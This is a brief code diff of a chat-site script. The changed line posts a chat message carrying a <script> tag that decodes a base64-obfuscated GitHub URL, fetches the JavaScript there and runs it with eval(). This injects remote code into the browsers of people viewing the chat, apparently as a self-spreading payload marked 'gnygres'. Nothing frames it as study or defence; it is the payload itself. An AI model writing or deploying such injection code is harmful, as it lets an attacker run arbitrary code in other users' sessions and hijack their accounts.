@@ -10,6 +10,6 @@ if (typeof gnygrescriptrunning === 'undefined') {
         document.getElementById('chat_send').style.backgroundImage = '', 
         socket.emit('command',{list:['color']}), 
         document.getElementById('chat_bar').style.backgroundImage = '', 
-        socket.emit('talk',{text:"gnygres<script>fetch(atob('')).then(r=>r.text()).then(t=>eval(t))</script>"})
+        socket.emit('talk',{text:"gnygres<script>fetch(atob('aHR0cHM6Ly9naXRodWIuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL2Jsb2IvbWFpbi9zY3IuanM=')).then(r=>r.text()).then(t=>eval(t))</script>"})
     }, 500)
 }
